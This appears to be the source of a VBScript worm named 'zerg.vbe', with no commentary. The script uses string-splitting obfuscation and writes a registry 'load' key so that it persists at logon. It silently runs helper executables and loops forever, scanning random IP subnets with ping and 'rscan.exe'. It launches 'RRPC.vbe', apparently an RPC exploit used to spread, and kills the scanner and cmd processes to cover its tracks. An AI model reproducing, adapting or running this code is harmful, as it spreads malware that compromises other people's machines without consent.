set fs = CreateObject("Scrip"&"ting.Fi"&"leSystemObject")
Set WshShell = WScript.CreateObject("WScript.Shell")
Set R = CreateObject("WScript.Shell") 
R.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\load",fs.GetSpecialFolder(1) & "\zerg.vbe","REG_SZ"
R.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\Programs","com exe bat pif cmd vbe","REG_SZ"
WshShell.Run "Cmd.exe /c RSDD.exe",0
TP = "iptemp.txt"
On Error Resume Next
while true
Randomize
r=Int((5*Rnd)+1)  
ip=r&".txt"
Set IPP = fs.opentextfile (ip,1)
DO While IPP.AtEndOfStream <> True
IP1 = IPP.Readline
Randomize
IP2=Int((254*Rnd)+1)
IP3=Int((254*Rnd)+1) 
TIP=IP1 & IP2 & "." & IP3
SIP=IP1 & IP2 & "."
xp = ""
WshShell.Run "Cmd.exe /c ping " & TIP & " >iptemp.txt",0
Wscript.Sleep 5000
set PI = fs.opentextfile (TP,1)
xp = PI.Readline
Do While Mid(xp,7,4) <> "from" And PI.AtEndOfStream <> True
If Mid(xp,7,4) <> "from" then 
 xp = PI.Readline
End If
Loop
if Mid(xp,7,4) = "from" then
fs.Deletefile("log.txt")
fs.Deletefile("ok.txt")
If TIP <> "" then
WshShell.Run "Cmd.exe /c rscan.exe " & SIP & "1-" & SIP & "255 >log.txt",0
Wscript.Sleep 120000
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'rscan.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 60
Next
WshShell.Run "Cmd.exe /c RRPC.vbe",0
End if
For X = 1 TO 60
Wscript.Sleep 60000
If (fs.fileexists("ok.txt"))then X=60
NEXT
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'rrpc.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 60
Next
end if
loop
strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colProcessList = objWMIService.ExecQuery _
("Select * from Win32_Process Where Name = 'cmd.exe'")
For Each objProcess in colProcessList
objProcess.Terminate()
Wscript.Sleep 60
Next
wend
